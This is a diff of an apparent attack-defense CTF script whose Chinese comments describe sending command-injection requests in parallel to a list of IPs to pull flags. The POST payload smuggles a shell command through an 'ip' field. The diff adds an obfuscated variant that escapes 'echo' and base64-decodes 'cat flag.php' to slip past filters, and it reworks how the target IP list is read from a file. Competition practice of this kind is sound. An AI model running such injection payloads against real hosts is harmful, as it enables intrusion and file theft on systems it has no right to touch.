@@ -33,7 +33,7 @@ def get_flag(ip_list):
     """并发向每个IP发送命令注入请求，提取flag"""
     flag_dict = {}
     data = {"ip": "127.0.0.1;cat /flag"}  # 根据实际调整payload
-
+    data = {"ip": "127.0.0.1;ec\ho \"Y2F0IGZsYWcucGhw\"|base64 -d"}  # 根据实际调整payload
     def attack(ip):
         url = f"http://{ip}"  # 若已知端口可拼接，否则可尝试常见端口
         try:
@@ -70,6 +70,14 @@ def get_flag(ip_list):
 
 
 if __name__ == "__main__":
-    with open("../后门/ip.txt", "r", encoding="utf-8") as f:
-        ip_list = f.readlines()
+    ip_list = []
+    with open('自动_ip.txt', 'r', encoding='utf-8') as file:
+        # 逐行读取
+        line = file.readline()
+        # 循环直到文件末尾
+        while line:
+            # 将读取的行添加到列表中，移除行尾的换行符
+            ip_list.append(line.strip())
+            # 读取下一行
+            line = file.readline()
     get_flag(ip_list)
